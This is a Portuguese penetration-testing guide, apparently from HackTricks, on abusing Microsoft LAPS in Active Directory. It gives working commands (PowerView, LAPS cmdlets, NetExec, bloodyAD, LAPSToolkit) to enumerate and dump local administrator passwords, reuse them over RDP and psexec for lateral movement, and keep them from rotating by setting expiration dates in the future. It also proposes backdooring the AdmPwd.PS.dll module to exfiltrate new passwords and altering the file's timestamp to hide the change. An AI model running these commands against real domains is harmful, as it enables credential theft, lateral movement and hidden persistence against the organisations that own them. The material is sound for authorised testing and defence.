# LAPS

{{#include ../../banners/hacktricks-training.md}}


## Informações básicas

Atualmente existem **2 variantes de LAPS** que você pode encontrar durante uma avaliação:

- **Legacy Microsoft LAPS**: armazena a senha do administrador local em **`ms-Mcs-AdmPwd`** e o horário de expiração em **`ms-Mcs-AdmPwdExpirationTime`**.
- **Windows LAPS** (integrado ao Windows desde as atualizações de abril de 2023): ainda pode emular o modo legacy, mas no modo nativo usa atributos **`msLAPS-*`**, suporta **password encryption**, **password history** e **DSRM password backup** para domain controllers.

LAPS foi projetado para gerenciar **senhas de administrador local**, tornando-as **únicas, aleatórias e frequentemente alteradas** em computadores ingressados no domínio. Se você conseguir ler esses atributos, normalmente pode **pivot as the local admin** para o host afetado. Em muitos ambientes, a parte interessante não é apenas ler a senha em si, mas também descobrir **quem recebeu delegação** para acessar os atributos de senha.

### Legacy Microsoft LAPS attributes

Nos objetos de computador do domínio, a implementação do legacy Microsoft LAPS resulta na adição de dois atributos:

- **`ms-Mcs-AdmPwd`**: **senha do administrador em texto claro**
- **`ms-Mcs-AdmPwdExpirationTime`**: **horário de expiração da senha**

### Windows LAPS attributes

O Windows LAPS nativo adiciona vários novos atributos aos objetos de computador:

- **`msLAPS-Password`**: blob de senha em texto claro armazenado como JSON quando a criptografia não está habilitada
- **`msLAPS-PasswordExpirationTime`**: horário de expiração agendado
- **`msLAPS-EncryptedPassword`**: senha atual criptografada
- **`msLAPS-EncryptedPasswordHistory`**: histórico de senhas criptografado
- **`msLAPS-EncryptedDSRMPassword`** / **`msLAPS-EncryptedDSRMPasswordHistory`**: dados criptografados da senha DSRM para domain controllers
- **`msLAPS-CurrentPasswordVersion`**: rastreamento de versão baseado em GUID usado por uma lógica mais nova de detecção de rollback (schema do forest do Windows Server 2025)

Quando **`msLAPS-Password`** é legível, o valor é um objeto JSON contendo o nome da conta, o horário de atualização e a senha em texto claro, por exemplo:
```json
{"n":"Administrator","t":"1d8161b41c41cde","p":"A6a3#7%..."}
```
### Verifique se está ativado
```bash
# Legacy Microsoft LAPS policy
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

dir "C:\Program Files\LAPS\CSE"
# Check if that folder exists and contains AdmPwd.dll

# Native Windows LAPS binaries / PowerShell module
Get-Command *Laps*
dir "$env:windir\System32\LAPS"

# Find GPOs that have "LAPS" or some other descriptive term in the name
Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

# Legacy Microsoft LAPS-enabled computers (any Domain User can usually read the expiration attribute)
Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" |
? { $_."ms-mcs-admpwdexpirationtime" -ne $null } |
select DnsHostname

# Native Windows LAPS-enabled computers
Get-DomainObject -LDAPFilter '(|(msLAPS-PasswordExpirationTime=*)(msLAPS-EncryptedPassword=*)(msLAPS-Password=*))' |
select DnsHostname
```
## LAPS Password Access

Você pode **baixar a policy bruta do LAPS** de `\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol` e então usar **`Parse-PolFile`** do pacote [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) para converter esse arquivo em um formato legível por humanos.

### Legacy Microsoft LAPS PowerShell cmdlets

Se o módulo legacy do LAPS estiver instalado, os seguintes cmdlets geralmente estão disponíveis:
```bash
Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS

# List who can read the LAPS password of the given OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Read the password
Get-AdmPwdPassword -ComputerName wkstn-2 | fl
```
### Cmdlets do Windows LAPS no PowerShell

O Windows LAPS nativo vem com um novo módulo do PowerShell e novos cmdlets:
```bash
Get-Command *Laps*

# Discover who has extended rights over the OU
Find-LapsADExtendedRights -Identity Workstations

# Read a password from AD
Get-LapsADPassword -Identity wkstn-2 -AsPlainText

# Include password history if encryption/history is enabled
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -IncludeHistory

# Query DSRM password from a DC object
Get-LapsADPassword -Identity dc01.contoso.local -AsPlainText
```
Alguns detalhes operacionais importam aqui:

- **`Get-LapsADPassword`** lida automaticamente com **legacy LAPS**, **clear-text Windows LAPS** e **encrypted Windows LAPS**.
- Se a password estiver encrypted e você puder **read** mas não **decrypt** ela, o cmdlet retorna metadata, mas não a clear-text password.
- **Password history** só está disponível quando **Windows LAPS encryption** está habilitado.
- Em domain controllers, a source retornada pode ser **`EncryptedDSRMPassword`**.

### PowerView / LDAP

**PowerView** também pode ser usado para descobrir **quem pode read the password e read it**:
```bash
# Legacy Microsoft LAPS: find principals with rights over the OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Legacy Microsoft LAPS: read the password directly from LDAP
Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpirationTime

# Native Windows LAPS clear-text mode
Get-DomainObject -Identity wkstn-2 -Properties msLAPS-Password,msLAPS-PasswordExpirationTime
```
Se **`msLAPS-Password`** for legível, analise o JSON retornado e extraia **`p`** para a senha e **`n`** para o nome da conta local admin gerenciada.

### Linux / remote tooling

Ferramentas modernas suportam tanto o legacy Microsoft LAPS quanto o Windows LAPS.
```bash
# NetExec / CrackMapExec lineage: dump LAPS values over LDAP
nxc ldap 10.10.10.10 -u user -p password -M laps

# Filter to a subset of computers
nxc ldap 10.10.10.10 -u user -p password -M laps -o COMPUTER='WKSTN-*'

# Use read LAPS access to authenticate to hosts at scale
nxc smb 10.10.10.0/24 -u user-can-read-laps -p 'Passw0rd!' --laps

# If the local admin name is not Administrator
nxc smb 10.10.10.0/24 -u user-can-read-laps -p 'Passw0rd!' --laps customadmin

# Legacy Microsoft LAPS with bloodyAD
bloodyAD --host 10.10.10.10 -d contoso.local -u user -p 'Passw0rd!' \
get search --filter '(ms-mcs-admpwdexpirationtime=*)' \
--attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
```
Notas:

- Builds recentes do **NetExec** suportam **`ms-Mcs-AdmPwd`**, **`msLAPS-Password`** e **`msLAPS-EncryptedPassword`**.
- **`pyLAPS`** ainda é útil para o **legacy Microsoft LAPS** a partir do Linux, mas ele só alvos **`ms-Mcs-AdmPwd`**.
- Se o ambiente usa **encrypted Windows LAPS**, uma simples leitura LDAP não é suficiente; você também precisa ser um **authorized decryptor** ou abusar de um caminho de decrypt suportado.

### Abuso de directory synchronization

Se você tiver direitos de **directory synchronization** em nível de domínio em vez de acesso direto de leitura em cada objeto de computador, LAPS ainda pode ser interessante.

A combinação de **`DS-Replication-Get-Changes`** com **`DS-Replication-Get-Changes-In-Filtered-Set`** ou **`DS-Replication-Get-Changes-All`** pode ser usada para sincronizar atributos **confidential / RODC-filtered** como o legado **`ms-Mcs-AdmPwd`**. BloodHound modela isso como **`SyncLAPSPassword`**. Veja [DCSync](dcsync.md) para o contexto dos replication-rights.

## LAPSToolkit

O [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) facilita a enumeração de LAPS com várias funções.\
Uma delas é analisar **`ExtendedRights`** para **todos os computadores com LAPS habilitado.** Isso mostra **grupos** especificamente **delegados para ler passwords do LAPS**, que muitas vezes são users em grupos protegidos.\
Uma **account** que tenha **joined a computer** a um domínio recebe `All Extended Rights` sobre esse host, e esse direito dá à **account** a capacidade de **ler passwords**. A enumeração pode mostrar uma user account que consegue ler o password do LAPS em um host. Isso pode nos ajudar a **target specific AD users** que conseguem ler passwords do LAPS.
```bash
# Get groups that can read passwords
Find-LAPSDelegatedGroups

OrgUnit                                           Delegated Groups
-------                                           ----------------
OU=Servers,DC=DOMAIN_NAME,DC=LOCAL                DOMAIN_NAME\Domain Admins
OU=Workstations,DC=DOMAIN_NAME,DC=LOCAL           DOMAIN_NAME\LAPS Admin

# Checks the rights on each computer with LAPS enabled for any groups
# with read access and users with "All Extended Rights"
Find-AdmPwdExtendedRights
ComputerName                Identity                    Reason
------------                --------                    ------
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\Domain Admins   Delegated
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\LAPS Admins     Delegated

# Get computers with LAPS enabled, expiration time and the password (if you have access)
Get-LAPSComputers
ComputerName                Password       Expiration
------------                --------       ----------
DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
```
## Dumping LAPS Passwords With NetExec / CrackMapExec

Se você não tiver um PowerShell interativo, você pode abusar dessa privilege remotamente via LDAP:
```bash
# Legacy syntax still widely seen in writeups
crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps

# Current project name / syntax
nxc ldap 10.10.10.10 -u user -p password -M laps
```
Isto despeja todos os segredos do LAPS que o usuário pode ler, permitindo que você se mova lateralmente com uma senha de administrador local diferente.

## Using LAPS Password
```bash
xfreerdp /v:192.168.1.1:3389 /u:Administrator
Password: 2Z@Ae)7!{9#Cq

python psexec.py Administrator@web.example.com
Password: 2Z@Ae)7!{9#Cq
```
## Persistência do LAPS

### Data de Expiração

Uma vez com acesso de admin, é possível **obter as passwords** e **impedir** que uma máquina **atualize** a sua **password** ao **definir a data de expiração para o futuro**.

Legacy Microsoft LAPS:
```bash
# Get expiration time
Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime

# Change expiration time
## SYSTEM on the computer is needed
Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```
Native Windows LAPS usa **`msLAPS-PasswordExpirationTime`** em vez disso:
```bash
# Read the current expiration timestamp
Get-DomainObject -Identity wkstn-2 -Properties msLAPS-PasswordExpirationTime

# Push the expiration into the future
Set-DomainObject -Identity wkstn-2 -Set @{"msLAPS-PasswordExpirationTime"="133801632000000000"}
```
> [!WARNING]
> A senha ainda será alterada se um **admin** usar **`Reset-AdmPwdPassword`** / **`Reset-LapsPassword`**, ou se **Do not allow password expiration time longer than required by policy** estiver habilitado.

### Recuperando senhas históricas de backups do AD

Quando **Windows LAPS encryption + password history** está habilitado, backups montados do AD podem se tornar uma fonte adicional de secrets. Se você conseguir acessar um snapshot montado do AD e usar **recovery mode**, você pode consultar senhas antigas armazenadas sem falar com um DC ativo.
```bash
# Query a mounted AD snapshot on port 50000
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -Port 50000 -RecoveryMode

# Historical entries if history is enabled
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -IncludeHistory -Port 50000 -RecoveryMode
```
Isto é principalmente relevante durante **AD backup theft**, **offline forensics abuse** ou **disaster-recovery media access**.

### Backdoor

O código-fonte original do legacy Microsoft LAPS pode ser encontrado [here](https://github.com/GreyCorbel/admpwd), portanto é possível colocar uma backdoor no código (dentro do método `Get-AdmPwdPassword` em `Main/AdmPwd.PS/Main.cs`, por exemplo) que de alguma forma **exfiltre novas passwords ou as armazene em algum lugar**.

Depois, compile o novo `AdmPwd.PS.dll` e faça upload dele para a máquina em `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll` (e altere o modification time).

## References

- [https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/](https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/)
- [https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-technical-reference](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-technical-reference)
- [https://blog.xpnsec.com/lapsv2-internals/](https://blog.xpnsec.com/lapsv2-internals/)


{{#include ../../banners/hacktricks-training.md}}
